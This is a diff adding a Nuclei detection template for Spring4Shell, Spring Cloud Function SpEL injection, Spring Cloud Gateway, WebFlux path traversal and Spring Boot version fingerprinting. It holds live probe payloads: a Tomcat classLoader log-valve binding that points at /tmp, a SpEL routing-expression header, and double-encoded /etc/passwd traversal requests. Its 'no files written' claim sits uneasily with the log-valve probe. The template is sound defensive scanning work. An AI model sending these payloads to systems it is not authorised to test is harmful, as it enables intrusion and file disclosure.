@@ -1,0 +1,154 @@
+id: spring4shell-and-variants-detection
+
+info:
+  name: Spring4Shell & Spring Framework CVE Variants (2022-2025)
+  author: achraf-chehboun
+  severity: critical
+  description: |
+    Detects Spring4Shell (CVE-2022-22965) and related Spring Framework RCE variants.
+    Tests for classLoader property access via data binding, Spring Cloud Function SpEL
+    injection (CVE-2022-22963), Spring Cloud Gateway actuator RCE (CVE-2022-22947),
+    and Spring WebFlux path traversal. Uses non-destructive probes that detect the
+    vulnerability surface without writing files or executing commands.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2022-22965
+    - https://nvd.nist.gov/vuln/detail/CVE-2022-22963
+    - https://nvd.nist.gov/vuln/detail/CVE-2022-22947
+    - https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-94
+  metadata:
+    max-request: 10
+  tags: spring4shell,cve-2022-22965,cve-2022-22963,cve-2022-22947,rce,spring,detection-only
+
+http:
+  # === CVE-2022-22965 (Spring4Shell) ===
+  # Detection: test classLoader property access via data binding
+  - raw:
+      - |
+        GET /?class.module.classLoader.DefaultAssertionStatus=nuclei HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+
+      - type: dsl
+        name: spring4shell-class-access
+        dsl:
+          - '!contains(body, "Cannot bind") && !contains(body, "rejected") && status_code != 404'
+
+  # Spring4Shell: Tomcat-specific classLoader property probe
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html
+
+        class.module.classLoader.resources.context.parent.pipeline.first.pattern=nuclei-detection-test&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt&class.module.classLoader.resources.context.parent.pipeline.first.directory=/tmp&class.module.classLoader.resources.context.parent.pipeline.first.prefix=nuclei-test&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: spring4shell-tomcat-binding
+        dsl:
+          - 'status_code == 200'
+          - 'status_code == 400 && !contains(body, "BindException") && !contains(body, "not found")'
+        condition: or
+
+  # Detection via error response analysis
+  - raw:
+      - |
+        GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern={{randstr}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers:
+      - type: dsl
+        name: spring4shell-property-traversal
+        dsl:
+          - 'status_code != 404 && !contains(body, "Whitelabel Error Page") && !contains(body, "not supported")'
+          - 'status_code == 200 || status_code == 400'
+        condition: and
+
+  # === CVE-2022-22963 (Spring Cloud Function) ===
+  - raw:
+      - |
+        POST /functionRouter HTTP/1.1
+        Host: {{Hostname}}
+        spring.cloud.function.routing-expression: T(java.lang.Math).abs(-1)
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+
+        nuclei=test
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: cve-2022-22963-spel-eval
+        dsl:
+          - 'contains(body, "1")'
+          - 'status_code == 500 && (contains(body, "SpelEvaluationException") || contains(body, "Expression") || contains(body, "java.lang.Math"))'
+        condition: or
+
+  # === CVE-2022-22947 (Spring Cloud Gateway) ===
+  # Detection: check if gateway actuator refresh endpoint exists
+  - raw:
+      - |
+        POST /actuator/gateway/refresh HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+    matchers:
+      - type: dsl
+        name: cve-2022-22947-gateway-refresh
+        dsl:
+          - 'status_code == 200'
+
+  # === SPRING WEBFLUX PATH TRAVERSAL ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/..%252F..%252F..%252Fetc%252Fpasswd"
+      - "{{BaseURL}}/%252e%252e/%252e%252e/etc/passwd"
+
+    matchers:
+      - type: regex
+        name: spring-webflux-traversal
+        regex:
+          - 'root:.*:0:0:'
+        part: body
+
+  # === SPRING BOOT VERSION FINGERPRINTING ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/actuator/info"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - 'contains(content_type, "json")'
+
+    extractors:
+      - type: regex
+        name: spring-boot-version
+        group: 1
+        regex:
+          - '"version"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+[^"]*)"'
+      - type: regex
+        name: java-version
+        group: 1
+        regex:
+          - '"java".*?"version"\s*:\s*"([^"]+)"'
